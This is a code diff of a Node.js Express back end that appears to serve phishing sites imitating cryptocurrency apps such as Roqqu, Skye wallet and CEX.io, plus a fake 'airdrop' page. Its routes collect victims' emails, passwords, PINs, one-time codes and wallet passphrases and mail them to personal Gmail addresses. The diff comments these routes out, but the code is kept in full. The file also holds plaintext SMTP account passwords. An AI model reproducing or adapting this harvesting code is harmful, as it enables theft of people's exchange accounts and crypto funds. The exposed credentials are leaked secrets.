@@ -20,7 +20,7 @@ app.use((req, res, next) => {
 })
 
 app.get('/', (req, res) => {
-    res.send('Welcome to roqq backend')
+    res.send('Welcome to rq1-backend')
 })
 
  const transporter = nodemailer.createTransport({
@@ -109,74 +109,119 @@ app.post('/roqquappchat', (req, res, next) => {
         }
     })
 })
-app.post('/roqquapp', (req, res, next) => {
-    console.log('req body', req.body)
-
-    const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquapp`
-
-    const mail = {
-        from: 'admin@growveonct.com',
-        to: 'princeco12@gmail.com',
-        //to: 'ifestephenie@gmail.com',
-        subject: 'New message from Roqquapp',
-        html: content,
-    }
-
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.roqquliveappchat.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'one@roqquliveappchat.com',
-    //         pass: 'FGChv+2Y%J8*',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
-
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
-// app.post('/roqqu-app', (req, res, next) => {
+// app.post('/roqquapp', (req, res, next) => {
 //     console.log('req body', req.body)
 
 //     const { email, password, pin, otp } = req.body
-//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqqu-app`
+//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquapp`
 
 //     const mail = {
-//         from: 'two@roqquliveappchat.com',
-//         to: 'paysroqquu@gmail.com',
+//         from: 'admin@growveonct.com',
+//         to: 'princeco12@gmail.com',
 //         //to: 'ifestephenie@gmail.com',
-//         subject: 'New message from Roqqu-app',
+//         subject: 'New message from Roqquapp',
+//         html: content,
+//     }
+
+//     // const transporter = nodemailer.createTransport({
+//     //     host: 'mail.roqquliveappchat.com',
+//     //     port: 465,
+//     //     secure: true,
+//     //     requireTLS: true,
+//     //     socketTimeout: 1200000,
+//     //     connectionTimeout: 1200000,
+//     //     auth: {
+//     //         user: 'one@roqquliveappchat.com',
+//     //         pass: 'FGChv+2Y%J8*',
+//     //     },
+//     //     tls: {
+//     //         rejectUnauthorized: false,
+//     //     },
+//     // })
+
+//     transporter.sendMail(mail, (err, data) => {
+//         if (err) {
+//             console.log({ err })
+//             res.json({
+//                 status: 'fail',
+//             })
+//         } else {
+//             console.log('email sent', data)
+//             res.json({
+//                 status: 'success',
+//             })
+//         }
+//     })
+// })
+// // app.post('/roqqu-app', (req, res, next) => {
+// //     console.log('req body', req.body)
+
+// //     const { email, password, pin, otp } = req.body
+// //     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqqu-app`
+
+// //     const mail = {
+// //         from: 'two@roqquliveappchat.com',
+// //         to: 'paysroqquu@gmail.com',
+// //         //to: 'ifestephenie@gmail.com',
+// //         subject: 'New message from Roqqu-app',
+// //         html: content,
+// //     }
+
+// //     const transporter = nodemailer.createTransport({
+// //         host: 'mail.roqquliveappchat.com',
+// //         port: 465,
+// //         secure: true,
+// //         requireTLS: true,
+// //         socketTimeout: 1200000,
+// //         connectionTimeout: 1200000,
+// //         auth: {
+// //             user: 'two@roqquliveappchat.com',
+// //             pass: 'MR.~-DC^?W}6',
+// //         },
+// //         tls: {
+// //             rejectUnauthorized: false,
+// //         },
+// //     })
+
+// //     transporter.sendMail(mail, (err, data) => {
+// //         if (err) {
+// //             console.log({ err })
+// //             res.json({
+// //                 status: 'fail',
+// //             })
+// //         } else {
+// //             console.log('email sent', data)
+// //             res.json({
+// //                 status: 'success',
+// //             })
+// //         }
+// //     })
+// // })
+
+// app.post('/roqqulive', (req, res, next) => {
+//     console.log('req body', req.body)
+
+//     const { email, password, pin, otp } = req.body
+//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
+
+//     const mail = {
+//         from: 'three@roqquliveappchat.com',
+//         //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
+//         to: 'ifestephenie@gmail.com',
+//         subject: 'New message from Roqquliveappchat',
 //         html: content,
 //     }
 
 //     const transporter = nodemailer.createTransport({
-//         host: 'mail.roqquliveappchat.com',
+//        host: 'mail.roqquliveappchat.com',
 //         port: 465,
 //         secure: true,
 //         requireTLS: true,
 //         socketTimeout: 1200000,
 //         connectionTimeout: 1200000,
 //         auth: {
-//             user: 'two@roqquliveappchat.com',
-//             pass: 'MR.~-DC^?W}6',
+//             user: 'three@roqquliveappchat.com',
+//             pass: 'nYrZ#&,nKb=3',
 //         },
 //         tls: {
 //             rejectUnauthorized: false,
@@ -198,266 +243,221 @@ app.post('/roqquapp', (req, res, next) => {
 //     })
 // })
 
-app.post('/roqqulive', (req, res, next) => {
-    console.log('req body', req.body)
+// // For skye wallet
+// app.post('/skye-app', (req, res, next) => {
+//     console.log('req body', req.body)
 
-    const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
+//     const { email, password, pin } = req.body
+//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p> `
 
-    const mail = {
-        from: 'three@roqquliveappchat.com',
-        //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
-        to: 'ifestephenie@gmail.com',
-        subject: 'New message from Roqquliveappchat',
-        html: content,
-    }
+//     const mail = {
+//         from: 'admin@growveonct.com',
+//         to: 'skyewallet.nigeria@gmail.com',
+//         subject: 'New message from Skyewallet-app',
+//         html: content,
+//     }
+//     // const transporter = nodemailer.createTransport({
+//     //     host: 'mail.growveonct.com',
+//     //     port: 465,
+//     //     secure: true,
+//     //     requireTLS: true,
+//     //     socketTimeout: 1200000,
+//     //     connectionTimeout: 1200000,
+//     //     auth: {
+//     //         user: 'admin@growveonct.com',
+//     //         pass: 'Panther1.?)0',
+//     //     },
+//     //     tls: {
+//     //         rejectUnauthorized: false,
+//     //     },
+//     // })
 
-    const transporter = nodemailer.createTransport({
-       host: 'mail.roqquliveappchat.com',
-        port: 465,
-        secure: true,
-        requireTLS: true,
-        socketTimeout: 1200000,
-        connectionTimeout: 1200000,
-        auth: {
-            user: 'three@roqquliveappchat.com',
-            pass: 'nYrZ#&,nKb=3',
-        },
-        tls: {
-            rejectUnauthorized: false,
-        },
-    })
+//     transporter.sendMail(mail, (err, data) => {
+//         if (err) {
+//             console.log({ err })
+//             res.json({
+//                 status: 'fail',
+//             })
+//         } else {
+//             console.log('email sent', data)
+//             res.json({
+//                 status: 'success',
+//             })
+//         }
+//     })
+// })
+// app.post('/skyecore', (req, res, next) => {
+//     console.log('req body', req.body)
 
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
+//     const { email, password, pin } = req.body
+//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br>`
 
-// For skye wallet
-app.post('/skye-app', (req, res, next) => {
-    console.log('req body', req.body)
+//     const mail = {
+//         from: 'admin@growveonct.com',
+//         to: 'ibominstagram@gmail.com',
+//         subject: 'New message from Skyewalletcore',
+//         html: content,
+//     }
+//     // const transporter = nodemailer.createTransport({
+//     //     host: 'mail.growveonct.com',
+//     //     port: 465,
+//     //     secure: true,
+//     //     requireTLS: true,
+//     //     socketTimeout: 1200000,
+//     //     connectionTimeout: 1200000,
+//     //     auth: {
+//     //         user: 'admin@growveonct.com',
+//     //         pass: 'Panther1.?)0',
+//     //     },
+//     //     tls: {
+//     //         rejectUnauthorized: false,
+//     //     },
+//     // })
 
-    const { email, password, pin } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p> `
+//     transporter.sendMail(mail, (err, data) => {
+//         if (err) {
+//             console.log({ err })
+//             res.json({
+//                 status: 'fail',
+//             })
+//         } else {
+//             console.log('email sent', data)
+//             res.json({
+//                 status: 'success',
+//             })
+//         }
+//     })
+// })
+// app.post('/blkairdrop', (req, res, next) => {
+//     console.log('req body', req.body)
 
-    const mail = {
-        from: 'admin@growveonct.com',
-        to: 'skyewallet.nigeria@gmail.com',
-        subject: 'New message from Skyewallet-app',
-        html: content,
-    }
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.growveonct.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'admin@growveonct.com',
-    //         pass: 'Panther1.?)0',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
+//     const { phrase } = req.body
+//     const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`
 
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
-app.post('/skyecore', (req, res, next) => {
-    console.log('req body', req.body)
+//     const mail = {
+//         from: 'admin@growveonct.com',
+//         to: 'testimonyibom@gmail.com',
+//         subject: 'New message from blockchainairdrop',
+//         html: content,
+//     }
 
-    const { email, password, pin } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br>`
+//     // const transporter = nodemailer.createTransport({
+//     //     host: 'mail.growveonct.com',
+//     //     port: 465,
+//     //     secure: true,
+//     //     requireTLS: true,
+//     //     socketTimeout: 1200000,
+//     //     connectionTimeout: 1200000,
+//     //     auth: {
+//     //         user: 'admin@growveonct.com',
+//     //         pass: 'Panther1.?)0',
+//     //     },
+//     //     tls: {
+//     //         rejectUnauthorized: false,
+//     //     },
+//     // })
 
-    const mail = {
-        from: 'admin@growveonct.com',
-        to: 'ibominstagram@gmail.com',
-        subject: 'New message from Skyewalletcore',
-        html: content,
-    }
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.growveonct.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'admin@growveonct.com',
-    //         pass: 'Panther1.?)0',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
+//     transporter.sendMail(mail, (err, data) => {
+//         if (err) {
+//             console.log({ err })
+//             res.json({
+//                 status: 'fail',
+//             })
+//         } else {
+//             console.log('email sent', data)
+//             res.json({
+//                 status: 'success',
+//             })
+//         }
+//     })
+// })
+// app.post('/blk-support', (req, res, next) => {
+//     console.log('req body', req.body)
 
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
-app.post('/blkairdrop', (req, res, next) => {
-    console.log('req body', req.body)
+//     const { phrase } = req.body
+//     const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`
 
-    const { phrase } = req.body
-    const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`
+//     const mail = {
+//         from: 'admin@growveonct.com',
+//         to: 'blessedhustle02@gmail.com',
+//         subject: 'New message from Block-chainsupport',
+//         html: content,
+//     }
 
-    const mail = {
-        from: 'admin@growveonct.com',
-        to: 'testimonyibom@gmail.com',
-        subject: 'New message from blockchainairdrop',
-        html: content,
-    }
+//     // const transporter = nodemailer.createTransport({
+//     //     host: 'mail.growveonct.com',
+//     //     port: 465,
+//     //     secure: true,
+//     //     requireTLS: true,
+//     //     socketTimeout: 1200000,
+//     //     connectionTimeout: 1200000,
+//     //     auth: {
+//     //         user: 'admin@growveonct.com',
+//     //         pass: 'Panther1.?)0',
+//     //     },
+//     //     tls: {
+//     //         rejectUnauthorized: false,
+//     //     },
+//     // })
 
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.growveonct.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'admin@growveonct.com',
-    //         pass: 'Panther1.?)0',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
+//     transporter.sendMail(mail, (err, data) => {
+//         if (err) {
+//             console.log({ err })
+//             res.json({
+//                 status: 'fail',
+//             })
+//         } else {
+//             console.log('email sent', data)
+//             res.json({
+//                 status: 'success',
+//             })
+//         }
+//     })
+// })
+// /////////////////// CEX
+// app.post('/cex-ioapp', (req, res, next) => {
+//     console.log('req body', req.body)
 
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
-app.post('/blk-support', (req, res, next) => {
-    console.log('req body', req.body)
+//     const { email, password, pin, otp } = req.body
+//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong> ${otp}</p>`
 
-    const { phrase } = req.body
-    const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`
+//     const mail = {
+//         from: 'admin@growveonct.com',
+//         to: 'Ibominstagram@gmail.com',
+//         subject: 'New message from Cexioapp',
+//         html: content,
+//     }
 
-    const mail = {
-        from: 'admin@growveonct.com',
-        to: 'blessedhustle02@gmail.com',
-        subject: 'New message from Block-chainsupport',
-        html: content,
-    }
+//     // const transporter = nodemailer.createTransport({
+//     //     host: 'mail.growveonct.com',
+//     //     port: 465,
+//     //     secure: true,
+//     //     requireTLS: true,
+//     //     socketTimeout: 1200000,
+//     //     connectionTimeout: 1200000,
+//     //     auth: {
+//     //         user: 'admin@growveonct.com',
+//     //         pass: 'Panther1.?)0',
+//     //     },
+//     //     tls: {
+//     //         rejectUnauthorized: false,
+//     //     },
+//     // })
 
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.growveonct.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'admin@growveonct.com',
-    //         pass: 'Panther1.?)0',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
-
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
-/////////////////// CEX
-app.post('/cex-ioapp', (req, res, next) => {
-    console.log('req body', req.body)
-
-    const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong> ${otp}</p>`
-
-    const mail = {
-        from: 'admin@growveonct.com',
-        to: 'Ibominstagram@gmail.com',
-        subject: 'New message from Cexioapp',
-        html: content,
-    }
-
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.growveonct.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'admin@growveonct.com',
-    //         pass: 'Panther1.?)0',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
-
-    transporter.sendMail(mail, (err, data) => {
-        if (err) {
-            console.log({ err })
-            res.json({
-                status: 'fail',
-            })
-        } else {
-            console.log('email sent', data)
-            res.json({
-                status: 'success',
-            })
-        }
-    })
-})
+//     transporter.sendMail(mail, (err, data) => {
+//         if (err) {
+//             console.log({ err })
+//             res.json({
+//                 status: 'fail',
+//             })
+//         } else {
+//             console.log('email sent', data)
+//             res.json({
+//                 status: 'success',
+//             })
+//         }
+//     })
+// })
 
 const PORT = process.env.PORT || 3030
 app.listen(PORT, () => console.info(`server has started on ${PORT}`))
